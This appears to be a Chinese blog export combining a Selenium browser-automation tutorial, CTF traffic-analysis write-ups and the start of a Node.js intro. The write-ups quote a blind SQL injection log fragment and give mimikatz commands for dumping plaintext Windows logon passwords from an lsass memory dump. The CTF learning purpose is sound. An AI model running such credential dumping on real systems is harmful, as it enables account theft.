这里我想要同时获取我的名字和我的blog地址\ncites = wd.find_elements(By.CSS_SELECTOR, &#x27;[href=&quot;https://charmersix.icu/&quot;]&gt;strong,[u^=&quot;1|5&quot;][tabindex=&quot;0&quot;]&gt;cite&#x27;)# print(cites.text)for cite in cites:    print(cite.text)\n\n\n父元素的第n个子节点我们可以指定选择的元素是父元素的第几个子节点\n使用nth-child\n比如说, 如果我们选择的是第二个子元素, 并且是span类型, 所以我们可以这样写\nspan:nth-child(2)\n\n如果选择的是所有位置为第二个的所有元素, 不管是什么类型, 可以直接写\n:nth-child(2)\n\n这里我们也可以指定父元素, 比如说我们可以通过父元素的id来指定, 这里借用一下白月黑羽测试页\n#t1&gt;:nth-child(2)\n\n\n当然也可以通过倒数来选择, 通过nth-last-child\n像这样\np:nth-last-child(2)\n\n\n父元素的第几个某类型的子节点这里我们使用:nth-of-type()\n\n同样, 倒数的是:nth-last-of-type()\n奇数节点和偶数节点果要选择的是父元素的 偶数节点，使用 nth-child(even)\n比如\np:nth-child(even)\n\n如果要选择的是父元素的 奇数节点，使用 nth-child(odd)\np:nth-child(odd)\n\n如果要选择的是父元素的 某类型偶数节点，使用 :nth-of-type(even)\n如果要选择的是父元素的 某类型奇数节点，使用 :nth-of-type(odd)\n\n兄弟节点选择相邻的兄弟关系我们可以用+来表示\n\n如果不相邻, 但是是后面的兄弟节点, 可以用~表示\n\nframe切换 这里我们再次借用一下白月黑羽的测试页, 比如说, 在这个界面里我们想要获取这些蔬菜的名字, 我们像往常一样, 写下这一串代码\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample2.html&#x27;)elements = wd.find_elements(By.CSS_SELECTOR, &#x27;.plant&#x27;)for i in elements:    print(i)\n\n\n仔细看, 我们会发现这些元素都是在一个叫iframe的元素中, 这个iframe中又嵌套了一个HTML, 在HTML语法中, frame元素或者iframe元素的内部会包含一个被嵌入的一个HTML\n如果我们直接find_elements的话, 是在我们第一层的里寻找, 很明显是无法找到的, 就算找到了也不是我们想要的内容\n如果我们要操作被嵌入的HTML中的元素, 就必须切换一下操作范围, 使用wd.switch_to.frame(frame_reference)\n其中frame_reference可以是frame元素的属性name或者ID\n比如这里, 可以直接写成wd.switch_to.frame(&#39;frame1&#39;)或者wd.switch_to.frame(&#39;innerFrame&#39;)\n我们也可以填写frame所对应的webelement对象, 就是在.switch_to.frame()的括号里再套用find_element系列的方法, 比如这里也可以写成wd.switch_to.frame(wd.find_element(By.TAG_NAME, &quot;iframe&quot;))\n所以我们正确的代码应该是\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample2.html&#x27;)#wd.switch_to.frame(&#x27;frame1&#x27;)#wd.switch_to.frame(&#x27;innerFrame&#x27;)wd.switch_to.frame(wd.find_element(By.CSS_SELECTOR,&#x27;iframe&#x27;))elements = wd.find_elements(By.CSS_SELECTOR,&#x27;.plant&#x27;)for i in elements:    print(i.text)\n\n\n那么, 这时候, 如果我们想再出来操作外层的HTML元素怎么办呢, 例如这里我们想点击一下这个外层的按钮\n我们只需要执行wd.switch_to.default_content()\n像这样, 只要返回了你点击了外部按钮, 就说明我们代码执行成功\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/sample2.html&#x27;)#wd.switch_to.frame(&#x27;frame1&#x27;)#wd.switch_to.frame(&#x27;innerFrame&#x27;)wd.switch_to.frame(wd.find_element(By.CSS_SELECTOR,&#x27;iframe&#x27;))elements = wd.find_elements(By.CSS_SELECTOR,&#x27;.plant&#x27;)for i in elements:    print(i.text)wd.switch_to.default_content()wd.find_element(By.ID,&#x27;outerbutton&#x27;).click()respon = wd.find_element(By.CSS_SELECTOR,&#x27;#add&gt;li&#x27;)print(respon.text)\n\n\n窗口切换有时候我们会遇到, 需要点击超链接进入到下一个窗口的情况, 比方说这里, 我想通过bing找到我的B站后, 进入到我的B站里\nfrom selenium import webdriverfrom selenium.webdriver.common.by import  Byimport time#from selenium.webdriver.chrome.service import Servicewd = webdriver.Chrome()#service = Service(r&#x27;G:\\tools\\chromedriver\\chromedriver.exe&#x27;))# 创建 WebDriver 对象，指明使用chrome浏览器驱动wd.get(&#x27;https://cn.bing.com/&#x27;)# 调用WebDriver 对象的get方法 可以让浏览器打开指定网址elements = wd.find_element(By.CSS_SELECTOR, &#x27;#sb_form_q&#x27;)#通过id选择特定元素elements.send_keys(&#x27;Charmersix&#x27;)search = wd.find_element(By.CSS_SELECTOR, &#x27;#search_icon&#x27;)# print(elements.get_attribute(&#x27;value&#x27;))# elements.clear()# elements.send_keys(&#x27;SkyMirror&#x27;)search.click()wd.implicitly_wait(5)wd.find_element(By.CSS_SELECTOR,&#x27;[data-bm=&quot;6&quot;]&gt;div&gt;h2&gt;a&#x27;).click()wd.implicitly_wait(5)for handle in wd.window_handles:    wd.switch_to.window(handle)    if &#x27;Charmersix&#x27; in wd.title:        breakprint(wd.title)\n\n\n如果我们想再次回到原来的界面, 可以事先保存老窗口, 像这样\nmain = wd.current_window_handlewd.find_element(By.CSS_SELECTOR,&#x27;[data-bm=&quot;6&quot;]&gt;div&gt;h2&gt;a&#x27;).click()time.sleep(3)for handle in wd.window_handles:    wd.switch_to.window(handle)    if &#x27;Charmersix_小六的个人空间_哔哩哔哩_bilibili&#x27; in wd.title:        breakwd.switch_to.window(main)print(wd.title)\n\n\n选择框这里借用白月黑羽师傅的测试页\nradio直接使用click方法点击选择即可, 首先, 我们可以用:checked来判断出已经选择的元素, 然后我们再点击重新选择一个新的\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)element = wd.find_element(By.CSS_SELECTOR,&#x27;#s_radio input:checked&#x27;)#:checked是CSS伪类选择,对radio和checkbox类型的input都有效print(&quot;当前选择的是&quot;+element.get_attribute(&#x27;value&#x27;))element = wd.find_element(By.CSS_SELECTOR,&#x27;#s_radio input[value=&quot;小雷老师&quot;]&#x27;).click()element = wd.find_element(By.CSS_SELECTOR,&#x27;#s_radio input:checked&#x27;)print(&quot;当前选择的已经改为&quot;+element.get_attribute(&#x27;value&#x27;))\n\n\ncheckboxcheckbox是复选框, 这里如果已经选择的框, 再去点击就会取消选择, 所以我们在选择开始前, 我们就先筛选出已经选择框点一下取消掉, 然后再去选择我们想选的\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)elements = wd.find_elements(By.CSS_SELECTOR,&#x27;#s_checkbox input:checked&#x27;)for element in elements:    print(&quot;当前选择的为&quot;+element.get_attribute(&#x27;value&#x27;))    element.click()obj = wd.find_element(By.CSS_SELECTOR,&#x27;#s_checkbox input[value=&quot;小雷老师&quot;]&#x27;).click()obj = wd.find_element(By.CSS_SELECTOR,&#x27;#s_checkbox input[value=&quot;小江老师&quot;]&#x27;).click()elements = wd.find_elements(By.CSS_SELECTOR,&#x27;#s_checkbox input:checked&#x27;)for element in elements:    print(&quot;当前选择的已经改为&quot;+element.get_attribute(&#x27;value&#x27;))\n\n    \nselectradio和checkbox都是input元素, 只是里边的type不同而已\nselect则是一个新的select标签, 对于select, selenium提供了专门的Select类进行操作\nSelect类中 提供了以下的方法\n\nselect_by_value 根据选项的value属性值选择元素\nselect_by_index 根据选项的次序(从1开始)选择元素\nselect_by_visible_text 根据选项的可见文本选择元素\ndeselect_by_ 是去除选中元素, 同样适用上述方法\ndeselect_all 去除选中的所有元素\n\n单选框对于单选框, 比较简单, 无论之前选的什么, 只需要直接选择即可\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import Selectwd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)obj = Select(wd.find_element(By.ID, &#x27;ss_single&#x27;))obj.select_by_visible_text(&#x27;小江老师&#x27;)print(&quot;当前选择的为&quot;+obj.get_attribute(&#x27;value&#x27;))\n\n\n多选框同上, 先用deselect_all()清除所有, 然后再选择\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import Selectwd = webdriver.Chrome()wd.get(&#x27;https://cdn2.byhy.net/files/selenium/test2.html&#x27;)obj = Select(wd.find_element(By.ID, &#x27;ss_multi&#x27;))wd.implicitly_wait(5)obj.deselect_all()obj.select_by_value(&#x27;小江老师&#x27;)obj.select_by_value(&#x27;小雷老师&#x27;)input()\n\n\n实战技巧其他操作方法之前我们对web元素做的主要操作是：选择元素,然后点击元素或者输入字符串, 其他操作我们可以通过Selenium提供的ActionChains类来实现\nActionChains类里面提供了一些特殊的动作的模拟, 我们可以通过查看ActionChains类的代码看到如下方法\n这里我们举一个鼠标移动的例子, 比如说, 我们的百度页面上, 有这个更多框, 这个框里的内容只有将鼠标移上才能显示出来\n代码如下\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.common.action_chains import ActionChainswd = webdriver.Chrome()wd.implicitly_wait(5)wd.get(&#x27;https://www.baidu.com/&#x27;)ac = ActionChains(wd)ac.move_to_element(wd.find_element(By.CSS_SELECTOR, &#x27;[name=&quot;tj_briicon&quot;]&#x27;)).perform()#perform()必须要有, 是执行的意思, 否则操作不会执行\n\n\n执行JavaScript我们可以调用execute_script执行我们的JavaScript代码\n例如, 有时我们访问的网页很长, 我们要点击的元素没有在窗口可以显示的范围内, selenium就会报类似这种错误\nelement click intercepted: Element &lt;span&gt;这里是元素html&lt;/span&gt; is not clickable at point (119, 10). Other element would receive the click: &lt;div&gt;...&lt;/div&gt;\n\n这时候, 我们就可以用下面这串代码, 让需要点击的元素出现在页面的最中间\nwd.execute_script(&quot;arguments[0].scrollIntoView(&#123;block:&#x27;center&#x27;,inline:&#x27;center&#x27;&#125;)&quot;, job)\n\n其中arguments[0]指代了后面的第一个参数job对应的js对象, js对象的scrollIntoView方法就是让元素滚动到可见部分\nblock:&#39;center&#39; 指定垂直方向居中\ninline:&#39;center&#39; 指定水平方向居中\n我们也可以通过下面这串代码, 来判断我们一个网站到底有几页\nnextPageButtonDisabled = driver.execute_script(    &#x27;&#x27;&#x27;    ele = document.querySelector(&#x27;.soupager &gt; button:last-of-type&#x27;);    return ele.getAttribute(&#x27;disabled&#x27;)    &#x27;&#x27;&#x27;)# 返回的数据转化为Python中的数据对象进行后续处理if nextPageButtonDisabled == &#x27;disabled&#x27;: # 是最后一页    return Trueelse: # 不是最后一页    return False\n\n\n这段代码是使用 Selenium WebDriver 和 JavaScript 执行一个查询，检查是否存在下一页的按钮，并返回该按钮是否被禁用(disabled)的状态。\n具体来说，这段代码做了以下几件事情：\n\n使用 driver.execute_script() 方法来执行一个 JavaScript 代码块。\nJavaScript 代码块中，使用 document.querySelector() 方法选择了 HTML 文档中的一个 class 为 soupager 的元素，并选中了该元素下面的最后一个 button 元素。\n接着使用 ele.getAttribute(&#39;disabled&#39;) 方法获取该 button 元素的 disabled 属性值，并将其返回给 Python 变量 nextPageButtonDisabled。\n最后根据 nextPageButtonDisabled 的值是否为字符串 ‘disabled’，来判断下一页的按钮是否被禁用(disabled)。\n\n如果 nextPageButtonDisabled 的值为 ‘disabled’，则表示下一页的按钮已被禁用，Python 函数将返回 True；否则，Python 函数将返回 False。\n\n冻结界面像上面例子一样, 当我们光标移开的时候, 更多里面的内容就无了, 这时候我们如果想要进一步操更多里面的内容, 我们就需要将眼前的界面冻结, 才能继续操作\n这里我们就需要利用JavaScript代码的debugger功能, 冻结页面\n可以让浏览器执行下列js代码, 进入debug状态, 冻住界面\nsetTimeout(function()&#123;debugger&#125;, 5000)\n\n这串代码意思是, 在5000ms也就是5s后, 执行页面的debugger命令, 冻住界面, 由于我们还需要进行鼠标移动的操作, 所以说要在5s后冻住界面\n这样就方便我们寻找元素\n弹出对话框Alertalert弹出框, selenium提供了点击方法\nwd.driver.switch_to.alert.accept()\n\n如果是获取对话框中的文本, 可以通过如下代码\nwd.switch_to.alert.text\n\nConfirm相比于alert, 多了一个取消按钮, 可以用dismiss, 代码如下\nwd.switch_to.alert.dismiss()\n\nPrompt相比于上面两个, 多了一个填信息的框, 方法如下\nwd.switch_to.alert.send_keys()\n\n我们可以通过下面的代码感受一下\nfrom selenium import webdriverfrom selenium.webdriver.common.by import Bywd = webdriver.Chrome()wd.implicitly_wait(5)wd.get(&#x27;https://www.baidu.com/&#x27;)wd.execute_script(&quot;alert(&#x27;charmersixalert&#x27;)&quot;)alert = wd.switch_to.alertprint(alert.text)alert.accept()prompt = wd.execute_script(&quot;confirm(&#x27;charmersixconfirm&#x27;)&quot;)confirm = wd.switch_to.alertprint(confirm.text)confirm.dismiss()wd.execute_script(&quot;prompt(&#x27;charmersixprompt&#x27;)&quot;)prompt = wd.switch_to.alertprint(prompt.text)prompt.send_keys(&quot;666&quot;)prompt.accept()\n\n\n窗口获取窗口大小wd.get_window_size()\n\n\n\n改变窗口大小wd.set_window_size(x, y)\n\n获取当前窗口标题wd.title\n\n获取当前窗口的url地址wd.current_url\n\n截屏在做自动化测试的时候, 我们有时候需要截屏方便人工核查或者方便debug, 这时候我们可以用get_screenshot_as_file方法来截屏并保存\nwd.get_screenshot_as_file(&#x27;./1.png&#x27;)\n\n手机模式可以通过desired_capabilities参数, 指定以手机模式打开chrome浏览器\n这里我们统一实验一下上述代码\nfrom selenium import webdrivermobile_emulation = &#123;&quot;driverName&quot;: &quot;iphone6s&quot;&#125;cheome_option = webdriver.ChromeOptions()cheome_option.add_experimental_option(&quot;mobileEmulation&quot;, mobile_emulation)wd = webdriver.Chrome(desired_capabilities = cheome_option.to_capabilities())wd.get(&#x27;http://www.baidu.com&#x27;)size = wd.get_window_size()title = wd.titleurl = wd.current_urlwd.get_screenshot_as_file(&#x27;./1.png&#x27;)print(size, title, url)wd.quit()\n\n\n上传文件通常, 网站页面上传文件的功能, 是通过type属性为file的HTML input元素实现的, 我们想要自动化上传文件, 只需要定位到input元素, 然后通过send_keys方法传入要上传的文件路径即可\nele = wd.find_element(By.CSS_SELECTOR, &#x27;input[type=file]&#x27;)# 先定位到上传文件的 input 元素ele.send_keys(r&#x27;h:\\1.png&#x27;)# 调用send_keys方法\n\n如果需要多次上传, 则多次调用即可, 但是，有的网页上传，是没有 file 类型 的 input 元素的。就需要再自己分析\n如果是Windows上的自动化，可以采用 Windows 平台专用的方法：\n确保 pywin32 已经安装，然后参考如下示例代码\n# 找到点击上传的元素，点击driver.find_element(By.CSS_SELECTOR, &#x27;.dropzone&#x27;).click()sleep(2) # 等待上传选择文件对话框打开# 直接发送键盘消息给 当前应用程序，# 前提是浏览器必须是当前应用import win32com.clientshell = win32com.client.Dispatch(&quot;WScript.Shell&quot;)# 输入文件路径，最后的&#x27;\\n&#x27;，表示回车确定，也可能时 &#x27;\\r&#x27; 或者 &#x27;\\r\\n&#x27;shell.Sendkeys(r&quot;h:\\a2.png&quot; + &#x27;\\n&#x27;)sleep(1)\n\n\n这段代码是使用Python中的Selenium库，模拟用户上传文件的操作。下面是逐行解释：\n\ndriver.find_element(By.CSS_SELECTOR, &#39;.dropzone&#39;).click(): 这行代码使用Selenium库的find_element方法根据CSS选择器定位页面上class为dropzone的元素，然后使用click方法模拟用户点击该元素，以此触发文件上传的功能。\nsleep(2): 这行代码使用Python标准库的time模块中的sleep函数，让程序等待2秒钟，等待上传选择文件对话框打开。\nimport win32com.client: 这行代码导入win32com模块的client子模块，用于调用Windows系统的COM接口。\nshell = win32com.client.Dispatch(&quot;WScript.Shell&quot;): 这行代码使用win32com模块的Dispatch函数创建一个名为shell的COM对象，该对象表示Windows系统中的Shell应用程序。\nshell.Sendkeys(r&quot;h:\\a2.png&quot; + &#39;\\n&#39;): 这行代码使用shell对象的Sendkeys方法，向当前应用程序发送一个包含文件路径和回车键的键盘消息。其中r&quot;h:\\a2.png&quot;是要上传的文件路径，&#39;\\n&#39;表示回车键。由于该函数的实现需要通过Windows的COM接口与应用程序交互，因此该函数的执行结果实际上是模拟用户在应用程序中按下了对应的按键。\nsleep(1): 这行代码使用time模块的sleep函数，让程序等待1秒钟，确保文件上传完成。\n\n\nXpath选择器有些场景用css选择web元素很麻烦, 然而xpath比较方便\n绝对路径选择相当于css选择器的&gt;\n例如, \nelements = driver.find_elements(By.XPATH, &quot;/html/body/div&quot;)\n\n就相当于\nelements = driver.find_elements(By.CSS_SELECTOR, &quot;html&gt;body&gt;div&quot;)\n\n相对路径选择相当于css选择器中的 \nelements = driver.find_elements(By.XPATH, &quot;//div//p&quot;)\n\n相当于\nelements = driver.find_elements(By.CSS_SELECTOR,&quot;div p&quot;)\n\n通配符如果要选择所有div节点的所有直接子节点，可以使用表达式 //div/*\n* 是一个通配符，对应任意节点名的元素，等价于CSS选择器 div &gt; *\n根据属性选择Xpath可以根据属性来选择元素, 大致格式是[@属性名=&#39;属性值&#39;]\n这里属性值可以为空\n注意:\n\n属性名前面要有@\n属性值要有引号, 单双无所谓\n\n但是xpath与css不同的是, xpath选择时, 必须要有标签名, 但是标签名可以用*通配\n例如\n属性值包含字符串要选择 style属性值 包含 color 字符串的 页面元素 ，可以这样 //*[contains(@style,&#39;color&#39;)]\n要选择 style属性值 以 color 字符串 开头 的 页面元素 ，可以这样 //*[starts-with(@style,&#39;color&#39;)]\n要选择 style属性值 以 某个 字符串 结尾 的 页面元素 ，大家可以推测是 //*[ends-with(@style,&#39;color&#39;)]， 但是，很遗憾，这是xpath 2.0 的语法 ，目前浏览器都不支持\n按次序选择xpath可以直接在[]中使用数字表示次序\n某类型的第几个元素//p[2]\n\n选择的是p类型的第二个子元素, 相当于css选择器的\n:nth-of-type()\n\n第几个子元素的话, 可以用通配符*来代替类型\n//*[2]\n\n某类型的倒数第几个子元素使用last()-数字\n\n倒数第一个\n//p[last()]\n倒数第二个\n//p[last()-1]\n\n范围选择使用position()\n\n比如说option类型的前两个元素\n\n可以是\n//option[position()&lt;=2]\n\n或者\n//option[position()&lt;3]\n\n\n选择class属性为multi_choice的前3个子元素\n\n//*[@class=&#x27;multi_choice&#x27;]/*[position()&lt;=3]\n\n\n选择class属性为multi_choice的后3个子元素\n\n//*[@class=&#x27;multi_choice&#x27;]/*[position()&gt;=last()-2]\n\n组选择和兄弟节点组选择css有组选择, 可以同时多个表达式, 多个表达式选择的结果都是要选择的元素\ncss组选择, 表达式之间用,隔开\nxpath组选择, 表达式用|隔开\n比如，要选所有的option元素 和所有的 h4 元素，可以使用\n//option | //h4\n\n等同于css选择器的\noption , h4\n\n再比如，要选所有的 class 为 single_choice 和 class 为 multi_choice 的元素，可以使用\n//*[@class=&#x27;single_choice&#x27;] | //*[@class=&#x27;multi_choice&#x27;]\n\n等同于css选择器\n.single_choice , .multi_choice\n\n选择父节点xpath可以选择父节点, 而css没有这一功能, 父节点用/..表示\n比如，要选择 id 为 china 的节点的父节点，可以这样写 //*[@id=&#39;china&#39;]/.. \n当某个元素没有特征可以直接选择，但是它有子节点有特征， 就可以采用这种方法，先选择子节点，再指定父节点。\n兄弟节点选择类似于前面css选择器的~\n这里xpath用following-sibling::\n比如，要选择 class 为 single_choice 的元素的所有后续兄弟节点 \n//*[@class=&#x27;single_choice&#x27;]/following-sibling::*\n\n等同于CSS选择器\n.single_choice ~ *\n\n如果，要选择后续节点中的div节点， 就应该这样写\n//*[@class=&#x27;single_choice&#x27;]/following-sibling::div\n\nxpath还可以选择前面的兄弟节点, 使用preceding-sibling::\n比如，要选择 class 为 single_choice 的元素的所有前面的兄弟节点 \n//*[@class=&#x27;single_choice&#x27;]/preceding-sibling::*\n\n而CSS选择器目前还没有方法选择前面的 兄弟节点\n想了解更多可以关注一下xapth手册\nselenium 注意点我们来看一个例子\n我们的代码：\n\n先选择示例网页中，id是china的元素\n然后通过这个元素的WebElement对象，使用find_elements_by_xpath，选择里面的p元素，\n\n# 先寻找id是china的元素china = wd.find_element(By.ID, &#x27;china&#x27;)# 再选择该元素内部的p元素elements = china.find_elements(By.XPATH, &#x27;//p&#x27;)# 打印结果for element in elements:    print(&#x27;----------------&#x27;)    print(element.get_attribute(&#x27;outerHTML&#x27;))\n\n运行发现，打印的 不仅仅是 china内部的p元素， 而是所有的p元素。\n要在某个元素内部使用xpath选择元素， 需要 在xpath表达式最前面加个点 。\n像这样\nelements = china.find_elements(By.XPATH, &#x27;.//p&#x27;)\n","tags":["Study","python","Selenium"]},{"title":"(陇剑杯 2021) SQL注入系列","url":"/2022/04/29/SQLflow/","content":"（1）第一题，看SQL注入的语句，很明显是布尔盲注的特征\n（2）这题更没劲，根据我的经验，流量分析倒着看就对了\n\n(select%20flag%20from%20sqli.flag),43,1)%20=%20’+’,1,(select%20table_name%20from%20information_schema.tables)\n\n数据库名#表名#字段名显而易见\n（3）将日志导入excel，筛选返回长度479 480 481 482\n\n然后再拿word替换一下，得到\n\nflag{deddcd67-bcfd-487e-b940-1217e668c7db}\n当然也可以写个脚本\n","tags":["wp","flow","Misc"]},{"title":"SkyMirror_WP_流量分析","url":"/2022/05/03/SkyMirror-WP-simple-flow/","content":"数据包中的线索题目在这儿\nwireshark打开，追踪流一波\n\n这base64编码，来这儿解码一下\n然后就能得到一张图片\n\nflag显而易见\n被偷走的文件题目在这儿\n这题可不全是流量分析 \nwireshark看一波\n\n一打眼，有ftp，一想《文件》，筛选一下ftp\n\n追踪一波\n\n看见了rar\n然后foremost分离一波\n讲到foremost，Kali linux里一般有，如果万一没有，像我下载的kali2021，可以apt下载一下\n像这样\n\nsudo apt-get updatesudo apt-get install foremost\n\n然后直接\n\nforemost  文件地址/文件名\n\n如果是存在了kali目录下，就不用加文件地址了\n分离得到的压缩包，我没有得到密码，直接就爆破了（因为没有得到任何提示）\nARCHPR四位数字掩码爆破\n\n密码5790\n解压得到flag\n菜刀666统计HTTP看一看，有个/upload/1.php\nCTRL+F搜一下1.php，过滤下HTTP\n追踪HTTP流看一看\n小技巧，倒着看\n\n有个压缩包，整出来，压缩包，有密码，而且提示了\n\n继续看\n\nZ2解码，十六进制，解码\n是个图片\n\n搞定！！！\ntelnet这题一看题目telnet，首先就过滤telnet\n追踪流一看，发现password有提示\n\n细心的小伙伴会发现这里有一些点，红色是源到目的地，蓝色反之，我们单独看一下红色的内容，发现变成了三个点，这三个点是不可见字符，而不是真正的三个点\n\n看16进制，发现08\n\n找ASCII码表，发现08是退格字符\n\n所以得到flag\n\n28d982kwalx8e\n\n[CISCN 2021初赛]robot题目在[这儿](http://ctfer.club/challenges#[CISCN 2021初赛]robot-128)\n这是去年国赛里比较简单的一题，这玩意压缩包一坨东西，其实也就流量是有用的，根据其他文件百度来看，能知道这是个画图的robot。看看流量里有没有什么坐标相关的。\n无脑追踪流看一看，\n\n好像坐标，grep分出来\n\nstrings a cap.pcapng |grep &quot;\\[.*\\]&quot; | sort -u &gt; 123.txt\n\n这种数据gnuplot没法识别，所以\nfile = open(&quot;123.txt&quot;,&#x27;r&#x27;)indata = file.read()obj = indata.replace(&quot;[&quot;,&quot;&quot;).replace(&quot;]&quot;,&quot;&quot;).replace(&quot;,&quot;,&quot; &quot;)out_file = open(&quot;out.txt&quot;,&#x27;w&#x27;)out_file.write(obj)print(&#x27;alright&#x27;)\n\n然后上到gnuplot\n\nplot &quot;out.txt&quot;\n\n\n旋转镜像对称一下\n\neasy_robo_xx\n记得MD5解一下\n还是这里\n得到flagd4f1fb80bc11ffd722861367747c0f10\n[GKCTF 2021]签到这也配叫签到题？题目[链接]([SkyMirror (ctfer.club)](http://ctfer.club/challenges#[GKCTF 2021]签到-129))\n本以为是签到题，打开CTRL+F搜一下flag，没有，坏了，不是签到\n追踪一下tcp吧，追踪到5，发现了f14g\n\n乱码，还是看HTTP流吧\n发现了\n\n64306c455357644251306c6e51554e4a5a3046355355737764306c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154576c44546d39525241707154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7162314645616b46445357644251306c6e51554e4a5a32644554545a46524530325157704e5a3046365458524e524531305257704e436e5177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d644442705130354e65556c7154586c4a616b31355357704e65556b4b4e6b467154576442656b31305455524e644556715458644a616b38775a566f324d6d56774e557377643074795556645a64315a485a48593152556c3051576c4e4d5546355a4777316255733254545a7162475a7763573579555552304d464e4d64444254544170304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d537a42425357526159585a764e7a567462485a735130354e564530325255524e436e6f77655531334d464e4e6555467154545a524e327877596a647362584a5252484a7a5131706f516c68614d446c745647637751306c355655524a4d315a74596e4676656d3951567974736357563151303477553078304d464e4d64444254544851775530774b63336858576d786b4d5659354d544e6c4e325179576d684752324a7a576d31615a7a427363446c7064573569567974585a7a427363446c7064573569567974585a7a427363446c706457356956797458537a423354586876564531336230524e6555464454517045546a4252524534775555527356324636546c684e65444258596d593562464a48556b524f5245347759584a6b4d464a6d4f565a6162444658596e644252456c6b556d46746345524c61577832526b6c6b556d46746345524c61577832566b747754544a5a436a303955556c6f545442525245347755516f3d\n\n像base16\n\n\nbase64解\n\n根据最后一行逆序吗？好像还是一行一行的\na = &quot;wIDIgACIgACIgAyIK0wIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMiCNoQD&quot;b = &quot;jMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjMyIjoQDjACIgACIgACIggDM6EDM6AjMgAzMtMDMtEjM&quot;c = &quot;t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0iCNMyIjMyIjMyIjMyI&quot;d = &quot;6AjMgAzMtMDMtEjMwIjO0eZ62ep5K0wKrQWYwVGdv5EItAiM1Aydl5mK6M6jlfpqnrQDt0SLt0SL&quot;e = &quot;t0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLt0SLK0AIdZavo75mlvlCNMTM6EDM&quot;f = &quot;z0yMw0SMyAjM6Q7lpb7lmrQDrsCZhBXZ09mTg0CIyUDI3VmbqozoPW+lqeuCN0SLt0SLt0SLt0SL&quot;g = &quot;sxWZld1V913e7d2ZhFGbsZmZg0lp9iunbW+Wg0lp9iunbW+Wg0lp9iunbW+WK0wMxoTMwoDMyACM&quot;h = &quot;DN0QDN0QDlWazNXMx0Wbf9lRGRDNDN0ard0Rf9VZl1WbwADIdRampDKilvFIdRampDKilvVKpM2Y&quot;i = &quot;==QIhM0QDN0Q&quot;print(a[::-1])print(b[::-1])print(c[::-1])print(d[::-1])print(e[::-1])print(f[::-1])print(g[::-1])print(h[::-1])print(i[::-1])\n\n\n去重，flag出了\nflag&#123;Welc0me_GkC4F_m1siCCCCCC!&#125;\n[安洵杯 2019]Attack之前做过一次菜刀的流量分析，这次来做一个蚁剑的\n这题挺强的，题目也是在[这儿]([SkyMirror (ctfer.club)](http://ctfer.club/challenges#[安洵杯 2019]Attack-139))\n老样子，先搜索flag看看\n\n\n这里也是看到了一个压缩包，然后我手提了n遍，一直没提准确，然后就foremost了，出一个压缩包\n缺密码，继续看。\n导出对象看看\n\n这啥玩意，上百度\n\n关于lsasslsass是windows系统的一个进程，用于本地安全和登陆策略。mimikatz可以从 lsass.exe 里获取windows处于active状态账号明文密码。本题的lsass.dmp就是内存运行的镜像，也可以提取到账户密码\n下载https://github.com/gentilkiwi/mimikatz/releases/\n如何使用把lsass.dmp复制到mimikatz的目录，然后运行mimikatz（一定要管理员身份运行）\n\n//提升权限privilege::debug//载入dmp文件sekurlsa::minidump lsass.dmp//读取登陆密码sekurlsa::logonpasswords full\n\n\n这也就是压缩包密码了，解压得到flag\n","tags":["python","wp","SkyMirror","simple_flow"]},{"title":"Web_11_Node.js","url":"/2023/05/30/Web_11_Node.js/","content":"Node.js基础简单的说nodejs就是运行在服务端的JavaScript, Node.js是一个基于chrome JavaScript运行时建立的一个平台, Node.js是一个事件驱动I/O服务端JavaScript环境, 基于Google的V8引擎, V8引擎执行Javascript的速度非常快，性能非常好。在浏览器控制台或者node的运行环境都属于repl运行环境, 均可运行JavaScript代码\n在Node.js中分为三个模块, 分别是: 核心模块/自定义模块/第三方模块\n这里提一点, JavaScript在编程时, 如果需要使用某个模块的功能, 那么就需要提前将其导入, 与Python类似, 只不过在Python中使用import关键字, 而在JavaScript中使用require关键字\nNode.js 安装大家可以自行去菜鸟学习安装配置\n安装完成后, 大家可以在命令行测试一下\n读取文件操作文件系统模块就是核心模块\nfs文件操作模块, 同步函数: readFileSync; 异步函数: readFile\n区别:\n\n同步方法: 等待每个操作完成, 然后执行下一个操作 (先吃饭再看电视)\n异步方法: 从不等待每个操作完成, 而是旨在第一步执行所有操作 (边吃饭边看电视)\n\nvar fs = require(&#x27;fs&#x27;);//异步读取fs.readFile(&#x27;./test.txt&#x27;, function (err, data)&#123;    if (err) &#123;        return console.error(err)    &#125;    console.log(&quot;异步读取：&quot; + data.toString());&#125;);//同步读取var data = fs.readFileSync(&#x27;./test.txt&#x27;)console.log(&quot;同步读取:&quot; + data.toString());console.log(&quot;程序执行完毕&quot;)\n\n\n\n当你先读取文件输出后输出一段话的时候同步：先输出文件内容，再输出一段话异步：先输出一段话，后输出文件内容\n\n读取文件操作, 下面会在CTF例题中用到. 显示了读取文件的各种姿势\n全局变量\n__dirname: 